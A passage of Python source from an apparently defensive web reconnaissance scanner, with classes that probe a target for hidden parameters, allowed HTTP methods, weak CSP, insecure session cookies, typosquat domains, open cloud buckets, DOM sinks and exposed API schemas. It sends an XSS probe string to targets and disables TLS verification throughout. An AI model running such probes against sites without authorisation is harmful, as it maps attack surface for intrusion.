                result['filename'],
                result['url'],
                f"[red]{result['status_code']}[/red]",
                f"{result['size']} bytes"
            )
        
        console.print(table)
        console.print(f"\n[red]⚠️  {len(exposed_files)} environment file(s) exposed! These may contain sensitive information![/red]")

class BrokenLinksChecker:
    @staticmethod
    def extract_links(html, base_url):
        try:
            from bs4 import BeautifulSoup
        except ImportError:
            BeautifulSoup = None
        from urllib.parse import urljoin, urlparse
        
        soup = BeautifulSoup(html, 'html.parser')
        links = set()
        
        # Extract href links
        for a in soup.find_all('a', href=True):
            url = urljoin(base_url, a['href']).split('#')[0]  # Remove fragments
            if urlparse(url).scheme in ('http', 'https'):
                links.add(url)
        
        # Extract src links (images, scripts, etc.)
        for element in soup.find_all(['img', 'script', 'link'], src=True):
            url = urljoin(base_url, element['src'])
            if urlparse(url).scheme in ('http', 'https'):
                links.add(url)
        
        for element in soup.find_all('link', href=True):
            url = urljoin(base_url, element['href'])
            if urlparse(url).scheme in ('http', 'https'):
                links.add(url)
        
        return list(links)

    @staticmethod
    def check_link_status(url, timeout=10):
        try:
            # Try HEAD first (faster)
            response = requests.head(url, timeout=timeout, verify=False, allow_redirects=True)
            if response.status_code == 405:  # Method not allowed, try GET
                response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            return response.status_code < 400
        except Exception:
            return False

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Broken Links Detection for: [cyan]{target}[/cyan][/white]")
        
        try:
            # Get main page
            response = requests.get(target, timeout=10, verify=False)
            if response.status_code != 200:
                console.print(f"[red]HTTP {response.status_code} error[/red]")
                return
            
            # Extract links
            links = BrokenLinksChecker.extract_links(response.text, target)
            console.print(f"[white]Found {len(links)} link(s) to check[/white]")
            
            if not links:
                console.print("[yellow]No links found to check[/yellow]")
                return
            
            # Sample links if too many (limit to 50 for performance)
            if len(links) > 50:
                import random
                links = random.sample(links, 50)
                console.print(f"[yellow]Sampling 50 random links for testing[/yellow]")
            
            broken_links = []
            
            with Progress(SpinnerColumn(), TextColumn("Checking links..."), console=console, transient=True) as prog:
                task = prog.add_task("", total=len(links))
                
                for link in links:
                    if not BrokenLinksChecker.check_link_status(link):
                        broken_links.append(link)
                    prog.advance(task)
            
            if broken_links:
                table = Table(show_header=True, header_style="bold white")
                table.add_column("Broken Link", style="red")
                
                for link in broken_links:
                    table.add_row(link)
                
                console.print(table)
                console.print(f"[red]Found {len(broken_links)} broken link(s)[/red]")
            else:
                console.print("[green]No broken links detected[/green]")
                
        except Exception as e:
            console.print(f"[red]Error during analysis: {str(e)}[/red]")

class HiddenParameterDiscovery:
    DEFAULT_PARAMS = [
        "debug", "test", "stage", "beta", "preview", "admin", "auth", "key", "token",
        "id", "ref", "redirect", "next", "lang", "locale", "format", "json", "xml",
        "callback", "output", "export", "download", "limit", "offset", "page", "sort"
    ]

    @staticmethod
    def get_baseline(url, timeout=10):
        try:
            response = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
            return len(response.content), response.status_code, response.text
        except Exception:
            return 0, 0, ""

    @staticmethod
    def test_parameter(url, param, value, baseline_len, baseline_status, timeout=10):
        try:
            response = requests.get(url, params={param: value}, timeout=timeout, verify=False, allow_redirects=False)
            length_diff = abs(len(response.content) - baseline_len)
            status_diff = response.status_code != baseline_status
            
            return {
                'param': param,
                'value': value,
                'status_code': response.status_code,
                'length': len(response.content),
                'length_diff': length_diff,
                'status_changed': status_diff,
                'interesting': length_diff > 50 or status_diff or response.is_redirect
            }
        except Exception:
            return {
                'param': param,
                'value': value,
                'status_code': 'ERROR',
                'length': 0,
                'length_diff': 0,
                'status_changed': False,
                'interesting': False
            }

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Hidden Parameter Discovery for: [cyan]{target}[/cyan][/white]")
        
        # Get baseline
        baseline_len, baseline_status, baseline_content = HiddenParameterDiscovery.get_baseline(target)
        if baseline_len == 0:
            console.print("[red]Failed to get baseline response[/red]")
            return
        
        console.print(f"[white]Baseline: {baseline_status} status, {baseline_len} bytes[/white]")
        
        test_values = ["1", "true", "admin", "<script>alert(1)</script>"]
        interesting_params = []
        
        with Progress(SpinnerColumn(), TextColumn("Testing parameters..."), console=console, transient=True) as prog:
            total_tests = len(HiddenParameterDiscovery.DEFAULT_PARAMS) * len(test_values)
            task = prog.add_task("", total=total_tests)
            
            for param in HiddenParameterDiscovery.DEFAULT_PARAMS:
                for value in test_values:
                    result = HiddenParameterDiscovery.test_parameter(
                        target, param, value, baseline_len, baseline_status
                    )
                    if result['interesting']:
                        interesting_params.append(result)
                    prog.advance(task)
        
        if interesting_params:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Parameter", style="cyan")
            table.add_column("Value", style="green")
            table.add_column("Status", style="yellow")
            table.add_column("Length", style="blue")
            table.add_column("Length Diff", style="magenta")
            table.add_column("Notes", style="white")
            
            for result in interesting_params:
                notes = []
                if result['status_changed']:
                    notes.append("Status changed")
                if result['length_diff'] > 100:
                    notes.append("Large response diff")
                
                table.add_row(
                    result['param'],
                    result['value'],
                    str(result['status_code']),
                    f"{result['length']} bytes",
                    f"+{result['length_diff']}" if result['length_diff'] > 0 else str(result['length_diff']),
                    ", ".join(notes) if notes else "Response changed"
                )
            
            console.print(table)
            console.print(f"[green]Found {len(interesting_params)} potentially interesting parameter(s)[/green]")
        else:
            console.print("[yellow]No interesting parameters discovered[/yellow]")

class HTTPMethodEnumerator:
    HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT"]

    @staticmethod
    def test_http_method(url, method, timeout=10):
        try:
            response = requests.request(method, url, timeout=timeout, verify=False, allow_redirects=False)
            return {
                'method': method,
                'status_code': response.status_code,
                'allowed': response.status_code not in [405, 501, 404],
                'content_length': len(response.content),
                'headers': dict(response.headers)
            }
        except Exception:
            return {
                'method': method,
                'status_code': 'ERROR',
                'allowed': False,
                'content_length': 0,
                'headers': {}
            }

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] HTTP Method Enumeration for: [cyan]{target}[/cyan][/white]")
        
        results = []
        allowed_methods = []
        
        with Progress(SpinnerColumn(), TextColumn("Testing HTTP methods..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(HTTPMethodEnumerator.HTTP_METHODS))
            
            for method in HTTPMethodEnumerator.HTTP_METHODS:
                result = HTTPMethodEnumerator.test_http_method(target, method)
                results.append(result)
                if result['allowed']:
                    allowed_methods.append(method)
                prog.advance(task)
        
        # Display results
        table = Table(show_header=True, header_style="bold white")
        table.add_column("Method", style="cyan")
        table.add_column("Status Code", style="green")
        table.add_column("Allowed", style="yellow")
        table.add_column("Content Length", style="blue")
        
        dangerous_methods = ["PUT", "DELETE", "TRACE", "CONNECT"]
        dangerous_found = []
        
        for result in results:
            allowed_text = "Yes" if result['allowed'] else "No"
            allowed_color = "green" if result['allowed'] else "red"
            
            if result['allowed'] and result['method'] in dangerous_methods:
                dangerous_found.append(result['method'])
                allowed_color = "red"
            
            table.add_row(
                result['method'],
                str(result['status_code']),
                f"[{allowed_color}]{allowed_text}[/{allowed_color}]",
                f"{result['content_length']} bytes"
            )
        
        console.print(table)
        console.print(f"[green]Allowed methods: {', '.join(allowed_methods) if allowed_methods else 'None'}[/green]")
        
        if dangerous_found:
            console.print(f"[red]⚠️  Dangerous methods enabled: {', '.join(dangerous_found)}[/red]")

class CSPAnalyzer:
    BAD_TOKENS = ["unsafe-inline", "unsafe-eval", "data:", "blob:", "*"]
    BASE_DIRECTIVES = ["default-src", "script-src", "object-src", "base-uri", "frame-ancestors"]

    @staticmethod
    def extract_csp_policy(response):
        # Check header first
        csp_header = response.headers.get("Content-Security-Policy")
        if csp_header:
            return csp_header, "Header"
        
        # Check meta tag
        import re
        meta_match = re.search(
            r'<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]+content=["\']([^"\']+)',
            response.text, re.I
        )
        if meta_match:
            return meta_match.group(1), "Meta Tag"
        
        return None, None

    @staticmethod
    def parse_csp_policy(policy):
        directives = {}
        for directive in policy.split(";"):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if parts:
                directives[parts[0]] = parts[1:] if len(parts) > 1 else []
        return directives

    @staticmethod
    def analyze_csp_security(directives):
        issues = []
        severity = "LOW"
        
        # Check for missing base directives
        missing = set(CSPAnalyzer.BASE_DIRECTIVES) - set(directives.keys())
        if missing:
            issues.append(f"Missing directives: {', '.join(missing)}")
            severity = "MEDIUM"
        
        # Check for unsafe tokens
        unsafe_found = []
        for directive, values in directives.items():
            for bad_token in CSPAnalyzer.BAD_TOKENS:
                if any(bad_token in value for value in values):
                    unsafe_found.append(f"{directive}: {bad_token}")
        
        if unsafe_found:
            issues.extend(unsafe_found)
            if any("unsafe-" in issue for issue in unsafe_found):
                severity = "HIGH"
        
        # Check for HTTP sources in HTTPS context
        http_sources = []
        for directive, values in directives.items():
            for value in values:
                if value.startswith("http://"):
                    http_sources.append(f"{directive}: {value}")
        
        if http_sources:
            issues.extend(http_sources)
            severity = "MEDIUM"
        
        return issues, severity

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Content Security Policy Analysis for: [cyan]{target}[/cyan][/white]")
        
        try:
            response = requests.get(target, timeout=10, verify=False)
            if response.status_code != 200:
                console.print(f"[red]HTTP {response.status_code} error[/red]")
                return
            
            policy, source = CSPAnalyzer.extract_csp_policy(response)
            
            if not policy:
                console.print("[red]No Content Security Policy found![/red]")
                console.print("[yellow]Recommendation: Implement a CSP header to prevent XSS attacks[/yellow]")
                return
            
            console.print(f"[green]CSP found in: {source}[/green]")
            
            # Parse and analyze policy
            directives = CSPAnalyzer.parse_csp_policy(policy)
            issues, severity = CSPAnalyzer.analyze_csp_security(directives)
            
            # Display directives
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Directive", style="cyan")
            table.add_column("Values", style="white")
            
            for directive, values in directives.items():
                values_str = " ".join(values) if values else "(none)"
                table.add_row(directive, values_str)
            
            console.print(table)
            
            # Display security analysis
            severity_color = "red" if severity == "HIGH" else "yellow" if severity == "MEDIUM" else "green"
            console.print(f"\n[white]Security Level: [{severity_color}]{severity}[/{severity_color}][/white]")
            
            if issues:
                console.print(f"\n[red]CSP Security Issues ({len(issues)}):[/red]")
                for i, issue in enumerate(issues, 1):
                    console.print(f"[red]{i}. {issue}[/red]")
            else:
                console.print("\n[green]No major CSP security issues found[/green]")
                
        except Exception as e:
            console.print(f"[red]Error during analysis: {str(e)}[/red]")

class SessionHijackTester:
    SESSION_HINTS = ["session", "sess", "sid", "phpsessid", "jsessionid", "aspsessionid", "token", "auth", "jwt"]

    @staticmethod
    def analyze_session_cookies(cookies):
        session_cookies = []
        
        for cookie in cookies:
            name_lower = cookie.name.lower()
            is_session = any(hint in name_lower for hint in SessionHijackTester.SESSION_HINTS)
            
            if is_session:
                # Check security attributes
                secure = cookie.secure
                httponly = hasattr(cookie, '_rest') and 'HttpOnly' in (cookie._rest or {})
                
                # Get SameSite attribute
                samesite = None
                if hasattr(cookie, '_rest') and cookie._rest:
                    for key, value in cookie._rest.items():
                        if key.lower() == 'samesite':
                            samesite = value
                            break
                
                # Assess risk
                risk_factors = []
                if not secure:
                    risk_factors.append("Missing Secure flag")
                if not httponly:
                    risk_factors.append("Missing HttpOnly flag")
                if not samesite or samesite.lower() not in ['strict', 'lax']:
                    risk_factors.append("Missing/weak SameSite")
                
                risk_level = "High" if len(risk_factors) >= 2 else "Medium" if risk_factors else "Low"
                
                session_cookies.append({
                    'name': cookie.name,
                    'secure': secure,
                    'httponly': httponly,
                    'samesite': samesite or "Not set",
                    'domain': cookie.domain or "Current domain",
                    'path': cookie.path or "/",
                    'risk_factors': risk_factors,
                    'risk_level': risk_level
                })
        
        return session_cookies

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] Session Hijacking Assessment for: [cyan]{target}[/cyan][/white]")
        
        # Test common paths that might set session cookies
        test_paths = ["/", "/login", "/signin", "/account", "/user", "/admin"]
        all_session_cookies = []
        
        with Progress(SpinnerColumn(), TextColumn("Testing session cookies..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(test_paths))
            
            for path in test_paths:
                try:
                    url = target.rstrip('/') + path
                    session = requests.Session()
                    response = session.get(url, timeout=10, verify=False, allow_redirects=True)
                    
                    session_cookies = SessionHijackTester.analyze_session_cookies(list(session.cookies))
                    for cookie in session_cookies:
                        cookie['found_at'] = path
                        if cookie not in all_session_cookies:  # Avoid duplicates
                            all_session_cookies.append(cookie)
                except Exception:
                    pass
                prog.advance(task)
        
        if not all_session_cookies:
            console.print("[yellow]No session cookies found[/yellow]")
            return
        
        # Display results
        table = Table(show_header=True, header_style="bold white")
        table.add_column("Cookie Name", style="cyan")
        table.add_column("Found At", style="blue")
        table.add_column("Secure", style="green")
        table.add_column("HttpOnly", style="yellow")
        table.add_column("SameSite", style="magenta")
        table.add_column("Risk Level", style="white")
        
        high_risk_count = 0
        
        for cookie in all_session_cookies:
            risk_color = "red" if cookie['risk_level'] == "High" else "yellow" if cookie['risk_level'] == "Medium" else "green"
            if cookie['risk_level'] == "High":
                high_risk_count += 1
            
            table.add_row(
                cookie['name'],
                cookie['found_at'],
                "Yes" if cookie['secure'] else "No",
                "Yes" if cookie['httponly'] else "No",
                cookie['samesite'],
                f"[{risk_color}]{cookie['risk_level']}[/{risk_color}]"
            )
        
        console.print(table)
        
        # Display detailed risk factors
        if any(cookie['risk_factors'] for cookie in all_session_cookies):
            console.print(f"\n[red]Session Security Issues:[/red]")
            for cookie in all_session_cookies:
                if cookie['risk_factors']:
                    console.print(f"[red]• {cookie['name']}: {', '.join(cookie['risk_factors'])}[/red]")
        
        if high_risk_count > 0:
            console.print(f"\n[red]⚠️  {high_risk_count} high-risk session cookie(s) detected![/red]")

class TyposquatChecker:
    TLD_SWAPS = ["com", "net", "org", "co", "io", "ai", "app", "dev", "info", "biz", "online"]
    
    @staticmethod
    def generate_typosquat_domains(domain):
        # Remove TLD for manipulation
        parts = domain.split('.')
        if len(parts) < 2:
            return []
        
        base_domain = parts[0]
        original_tld = '.'.join(parts[1:])
        
        typosquats = []
        
        # Character substitution
        char_subs = {
            'a': ['4', '@'], 'e': ['3'], 'i': ['1', 'l'], 'o': ['0'], 's': ['5', 'z'],
            'l': ['1', 'i'], 'g': ['9'], 'b': ['8'], 't': ['7']
        }
        
        for i, char in enumerate(base_domain):
            if char.lower() in char_subs:
                for sub in char_subs[char.lower()]:
                    typo = base_domain[:i] + sub + base_domain[i+1:]
                    typosquats.append(f"{typo}.{original_tld}")
        
        # Character deletion
        for i in range(len(base_domain)):
            if len(base_domain) > 3:  # Don't make it too short
                typo = base_domain[:i] + base_domain[i+1:]
                typosquats.append(f"{typo}.{original_tld}")
        
        # Character insertion
        for i in range(len(base_domain) + 1):
            for char in 'abcdefghijklmnopqrstuvwxyz':
                typo = base_domain[:i] + char + base_domain[i:]
                if len(typo) <= 15:  # Keep reasonable length
                    typosquats.append(f"{typo}.{original_tld}")
        
        # TLD variations
        for tld in TyposquatChecker.TLD_SWAPS:
            if tld != original_tld:
                typosquats.append(f"{base_domain}.{tld}")
        
        # Remove duplicates and limit
        return list(set(typosquats))[:100]

    @staticmethod
    def check_domain_exists(domain, timeout=5):
        try:
            import socket
            socket.gethostbyname(domain)
            return True
        except Exception:
            return False

    @staticmethod
    def run(target):
        domain = clean_domain_input(target)
        console.print(f"[white][*] Typosquat Domain Check for: [cyan]{domain}[/cyan][/white]")
        
        # Generate potential typosquat domains
        typosquats = TyposquatChecker.generate_typosquat_domains(domain)
        console.print(f"[white]Generated {len(typosquats)} potential typosquat domains[/white]")
        
        if not typosquats:
            console.print("[yellow]No typosquat domains generated[/yellow]")
            return
        
        existing_domains = []
        
        with Progress(SpinnerColumn(), TextColumn("Checking domains..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(typosquats))
            
            for typo_domain in typosquats:
                if TyposquatChecker.check_domain_exists(typo_domain):
                    existing_domains.append(typo_domain)
                prog.advance(task)
        
        if existing_domains:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Potential Typosquat Domain", style="red")
            table.add_column("Type", style="yellow")
            
            for typo_domain in existing_domains:
                # Determine type of typosquat
                if any(tld in typo_domain for tld in TyposquatChecker.TLD_SWAPS):
                    typo_type = "TLD Variation"
                elif len(typo_domain.split('.')[0]) < len(domain.split('.')[0]):
                    typo_type = "Character Deletion"
                elif len(typo_domain.split('.')[0]) > len(domain.split('.')[0]):
                    typo_type = "Character Insertion"
                else:
                    typo_type = "Character Substitution"
                
                table.add_row(typo_domain, typo_type)
            
            console.print(table)
            console.print(f"[red]⚠️  Found {len(existing_domains)} potential typosquat domain(s)![/red]")
        else:
            console.print("[green]No existing typosquat domains found[/green]")

class CloudBucketScanner:
    AWS_TEMPLATES = [
        "https://{bucket}.s3.amazonaws.com/",
        "https://{bucket}.s3-us-east-1.amazonaws.com/",
        "https://{bucket}.s3.eu-west-1.amazonaws.com/",
        "https://s3.amazonaws.com/{bucket}/"
    ]
    
    AZURE_TEMPLATE = "https://{bucket}.blob.core.windows.net/?restype=container&comp=list"
    GCP_TEMPLATE = "https://storage.googleapis.com/storage/v1/b/{bucket}/o"
    
    BUCKET_WORDS = ["backup", "backups", "data", "files", "static", "media", "images", "assets", "logs", "db", "dump", "public", "private", "upload", "uploads"]

    @staticmethod
    def generate_bucket_names(domain):
        parts = domain.split('.')
        base = domain.replace('.', '-')
        
        buckets = {base, parts[0]}
        
        for word in CloudBucketScanner.BUCKET_WORDS:
            buckets.add(f"{base}-{word}")
            buckets.add(f"{parts[0]}-{word}")
            buckets.add(f"{word}-{parts[0]}")
        
        return list(buckets)[:50]  # Limit for performance

    @staticmethod
    def test_bucket(url, timeout=10):
        try:
            response = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
            return {
                'url': url,
                'status_code': response.status_code,
                'size': len(response.content),
                'accessible': response.status_code == 200 and len(response.content) > 0,
                'content_type': response.headers.get('Content-Type', '')
            }
        except Exception:
            return {
                'url': url,
                'status_code': 'ERROR',
                'size': 0,
                'accessible': False,
                'content_type': ''
            }

    @staticmethod
    def run(target):
        domain = clean_domain_input(target)
        console.print(f"[white][*] Cloud Bucket Exposure Scan for: [cyan]{domain}[/cyan][/white]")
        
        bucket_names = CloudBucketScanner.generate_bucket_names(domain)
        console.print(f"[white]Testing {len(bucket_names)} bucket name variations[/white]")
        
        test_urls = []
        for bucket in bucket_names:
            for template in CloudBucketScanner.AWS_TEMPLATES + [CloudBucketScanner.AZURE_TEMPLATE, CloudBucketScanner.GCP_TEMPLATE]:
                test_urls.append(template.format(bucket=bucket))
        
        accessible_buckets = []
        
        with Progress(SpinnerColumn(), TextColumn("Scanning cloud buckets..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(test_urls))
            
            for url in test_urls:
                result = CloudBucketScanner.test_bucket(url)
                if result['accessible']:
                    accessible_buckets.append(result)
                prog.advance(task)
        
        if accessible_buckets:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("Bucket URL", style="red")
            table.add_column("Status", style="green")
            table.add_column("Size", style="yellow")
            table.add_column("Content Type", style="blue")
            
            for bucket in accessible_buckets:
                table.add_row(
                    bucket['url'],
                    str(bucket['status_code']),
                    f"{bucket['size']} bytes",
                    bucket['content_type']
                )
            
            console.print(table)
            console.print(f"[red]⚠️  Found {len(accessible_buckets)} publicly accessible cloud bucket(s)![/red]")
        else:
            console.print("[green]No publicly accessible cloud buckets found[/green]")

class DOMSinkScanner:
    SINK_PATTERNS = {
        "eval": r"\beval\s*\(",
        "innerHTML": r"\binnerHTML\s*=",
        "outerHTML": r"\bouterHTML\s*=",
        "document.write": r"\bdocument\.write\s*\(",
        "setTimeout": r"\bsetTimeout\s*\(",
        "setInterval": r"\bsetInterval\s*\(",
        "Function": r"\bnew\s+Function\s*\(",
        "location.assign": r"\blocation\.assign\s*\(",
        "location.replace": r"\blocation\.replace\s*\(",
        "insertAdjacentHTML": r"\binsertAdjacentHTML\s*\("
    }

    @staticmethod
    def extract_javascript(html, base_url):
        import re
        from urllib.parse import urljoin
        
        # Extract external scripts
        script_pattern = re.compile(r"<script[^>]+src=['\"]([^'\"]+)['\"]", re.I)
        external_scripts = []
        for match in script_pattern.finditer(html):
            script_url = urljoin(base_url, match.group(1))
            external_scripts.append(script_url)
        
        # Extract inline scripts
        inline_pattern = re.compile(r"<script[^>]*>(.*?)</script>", re.I | re.S)
        inline_scripts = []
        for match in inline_pattern.finditer(html):
            inline_scripts.append(match.group(1))
        
        return external_scripts, inline_scripts

    @staticmethod
    def scan_for_sinks(javascript_code):
        import re
        
        found_sinks = []
        for sink_name, pattern in DOMSinkScanner.SINK_PATTERNS.items():
            matches = re.findall(pattern, javascript_code, re.I)
            if matches:
                found_sinks.append((sink_name, len(matches)))
        
        return found_sinks

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] DOM Sink Scanner for: [cyan]{target}[/cyan][/white]")
        
        try:
            response = requests.get(target, timeout=10, verify=False)
            if response.status_code != 200:
                console.print(f"[red]HTTP {response.status_code} error[/red]")
                return
            
            # Extract JavaScript
            external_scripts, inline_scripts = DOMSinkScanner.extract_javascript(response.text, target)
            console.print(f"[white]Found {len(external_scripts)} external script(s) and {len(inline_scripts)} inline script(s)[/white]")
            
            all_sinks = []
            
            # Scan inline scripts
            for i, script in enumerate(inline_scripts):
                sinks = DOMSinkScanner.scan_for_sinks(script)
                for sink_name, count in sinks:
                    all_sinks.append(('Inline Script', f"Script #{i+1}", sink_name, count))
            
            # Scan external scripts (limit to first 10 for performance)
            with Progress(SpinnerColumn(), TextColumn("Scanning external scripts..."), console=console, transient=True) as prog:
                task = prog.add_task("", total=min(len(external_scripts), 10))
                
                for i, script_url in enumerate(external_scripts[:10]):
                    try:
                        script_response = requests.get(script_url, timeout=10, verify=False)
                        if script_response.status_code == 200:
                            sinks = DOMSinkScanner.scan_for_sinks(script_response.text)
                            for sink_name, count in sinks:
                                all_sinks.append(('External Script', script_url, sink_name, count))
                    except Exception:
                        pass
                    prog.advance(task)
            
            if all_sinks:
                table = Table(show_header=True, header_style="bold white")
                table.add_column("Source Type", style="cyan")
                table.add_column("Source", style="white")
                table.add_column("Sink Type", style="red")
                table.add_column("Count", style="yellow")
                
                for source_type, source, sink_name, count in all_sinks:
                    # Truncate long URLs
                    display_source = source if len(source) <= 60 else source[:57] + "..."
                    table.add_row(source_type, display_source, sink_name, str(count))
                
                console.print(table)
                console.print(f"[red]⚠️  Found {len(all_sinks)} potential DOM sink(s)![/red]")
                console.print("[yellow]These sinks could be vulnerable to DOM-based XSS attacks[/yellow]")
            else:
                console.print("[green]No DOM sinks detected[/green]")
                
        except Exception as e:
            console.print(f"[red]Error during analysis: {str(e)}[/red]")

class APIGrabber:
    API_PATHS = [
        "/swagger.json", "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
        "/openapi.json", "/openapi.yaml", "/openapi.yml", "/api-docs", 
        "/v3/api-docs", "/v2/api-docs", "/docs/json", "/docs/swagger.json",
        "/redoc", "/api/swagger.json", "/api/openapi.json",
        "/.well-known/openapi.json", "/.well-known/openapi.yaml"
    ]
    
    GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/graphiql"]
    INTROSPECTION_QUERY = {"query": "query { __schema { types { name } } }"}

    @staticmethod
    def test_api_endpoint(url, timeout=10, json_payload=None):
        try:
            start_time = time.time()
            if json_payload:
                response = requests.post(url, json=json_payload, timeout=timeout, verify=False)
            else:
                response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            
            elapsed = int((time.time() - start_time) * 1000)
            
            api_type = "Unknown"
            if response.status_code == 200:
                content_type = response.headers.get("Content-Type", "").lower()
                text = response.text
                
                if json_payload and "__schema" in text:
                    api_type = "GraphQL"
                elif "json" in content_type:
                    try:
                        data = response.json()
                        if any(key in data for key in ["swagger", "openapi"]):
                            api_type = "OpenAPI/Swagger"
                        else:
                            api_type = "JSON API"
                    except Exception:
                        api_type = "JSON Response"
                
            return {
                'url': url,
                'status_code': response.status_code,
                'size': len(response.content),
                'content_type': response.headers.get("Content-Type", ""),
                'api_type': api_type,
                'response_time': elapsed,
                'accessible': response.status_code == 200
            }
        except Exception:
            return {
                'url': url,
                'status_code': 'ERROR',
                'size': 0,
                'content_type': '',
                'api_type': 'Unknown',
                'response_time': 0,
                'accessible': False
            }

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] API Schema Grabber for: [cyan]{target}[/cyan][/white]")
        
        all_endpoints = []
        
        # Test OpenAPI/Swagger endpoints
        for path in APIGrabber.API_PATHS:
            url = target.rstrip('/') + path
            all_endpoints.append((url, None))
        
        # Test GraphQL endpoints
        for path in APIGrabber.GRAPHQL_PATHS:
            url = target.rstrip('/') + path
            all_endpoints.append((url, APIGrabber.INTROSPECTION_QUERY))
        
        results = []
        accessible_apis = []
        
        with Progress(SpinnerColumn(), TextColumn("Testing API endpoints..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=len(all_endpoints))
            
            for url, payload in all_endpoints:
                result = APIGrabber.test_api_endpoint(url, json_payload=payload)
                results.append(result)
                if result['accessible']:
                    accessible_apis.append(result)
                prog.advance(task)
        
        if accessible_apis:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("URL", style="cyan")
            table.add_column("API Type", style="green")
            table.add_column("Status", style="yellow")
            table.add_column("Size", style="blue")
            table.add_column("Response Time", style="magenta")
            
            for api in accessible_apis:
                table.add_row(
                    api['url'],
                    api['api_type'],
                    str(api['status_code']),
                    f"{api['size']} bytes",
                    f"{api['response_time']}ms"
                )
            
            console.print(table)
            console.print(f"[green]Found {len(accessible_apis)} accessible API endpoint(s)[/green]")
        else:
            console.print("[yellow]No accessible API endpoints found[/yellow]")

class CAPTCHAChecker:
    CAPTCHA_SIGNATURES = {
        "reCAPTCHA": r"www\.google\.com/recaptcha|data-sitekey|g-recaptcha",
        "hCaptcha": r"hcaptcha\.com/1/site\.js",
        "FriendlyCaptcha": r"friendlycaptcha\.com",
        "Cloudflare Turnstile": r"challenges\.cloudflare\.com/turnstile"
    }

    @staticmethod
    def detect_captcha(html):
        import re
        
        found_captchas = []
        html_lower = html.lower()
        
        for captcha_name, pattern in CAPTCHAChecker.CAPTCHA_SIGNATURES.items():
            if re.search(pattern, html_lower):
                found_captchas.append(captcha_name)
        
        return found_captchas

    @staticmethod
    def crawl_pages(base_url, max_pages=20):
        import re
        from urllib.parse import urljoin, urlparse
        
        pages = []
        seen = {base_url}
        queue = [base_url]
        
        while queue and len(pages) < max_pages:
            url = queue.pop(0)
            try:
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                    pages.append((url, response.text))
                    
                    # Extract more links
                    for match in re.finditer(r'href=["\']([^"\'#]+)', response.text):
                        link = urljoin(url, match.group(1))
                        if (link.startswith(('http://', 'https://')) and 
                            urlparse(link).netloc == urlparse(base_url).netloc and 
                            link not in seen):
                            seen.add(link)
                            queue.append(link)
            except Exception:
                continue
        
        return pages

    @staticmethod
    def run(target):
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        console.print(f"[white][*] CAPTCHA Detection for: [cyan]{target}[/cyan][/white]")
        
        with Progress(SpinnerColumn(), TextColumn("Crawling pages..."), console=console, transient=True) as prog:
            task = prog.add_task("", total=1)
            pages = CAPTCHAChecker.crawl_pages(target)
            prog.advance(task)
        
        console.print(f"[white]Scanned {len(pages)} page(s)[/white]")
        
        captcha_results = []
        
        for url, html in pages:
            captchas = CAPTCHAChecker.detect_captcha(html)
            if captchas:
                captcha_results.append((url, captchas))
        
        if captcha_results:
            table = Table(show_header=True, header_style="bold white")
            table.add_column("URL", style="cyan")
            table.add_column("CAPTCHA Type(s)", style="yellow")
            
            for url, captchas in captcha_results:
                table.add_row(url, ", ".join(captchas))
            
            console.print(table)
            console.print(f"[green]Found CAPTCHA on {len(captcha_results)} page(s)[/green]")
        else:
            console.print("[yellow]No CAPTCHA systems detected[/yellow]")

class FileUploadFinder:
    @staticmethod
    def extract_upload_forms(html, base_url):
        import re
        from urllib.parse import urljoin
        
        upload_forms = []
        
        # Look for file input types
        file_input_pattern = re.compile(r'<input[^>]*type=["\']?file["\']?[^>]*>', re.I)
        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.I | re.S)
        
        for form_match in form_pattern.finditer(html):
            form_html = form_match.group(0)
            form_content = form_match.group(1)
            
            # Check if this form has file inputs
            if file_input_pattern.search(form_content):
                # Extract form attributes
                action_match = re.search(r'action=["\']?([^"\'>\s]+)', form_html, re.I)
                method_match = re.search(r'method=["\']?([^"\'>\s]+)', form_html, re.I)
                enctype_match = re.search(r'enctype=["\']?([^"\'>\s]+)', form_html, re.I)
                
                action = action_match.group(1) if action_match else base_url
                if action and not action.startswith(('http://', 'https://')):
                    action = urljoin(base_url, action)
                
                method = method_match.group(1).upper() if method_match else 'GET'
                enctype = enctype_match.group(1) if enctype_match else 'application/x-www-form-urlencoded'
                
                # Check for CSRF protection
                csrf_protected = bool(re.search(r'csrf|xsrf|token', form_content, re.I))
                
                # Count file inputs
                file_inputs = len(file_input_pattern.findall(form_content))
                
                upload_forms.append({
                    'action': action,
                    'method': method,
                    'enctype': enctype,
                    'file_inputs': file_inputs,
                    'csrf_protected': csrf_protected
                })
        
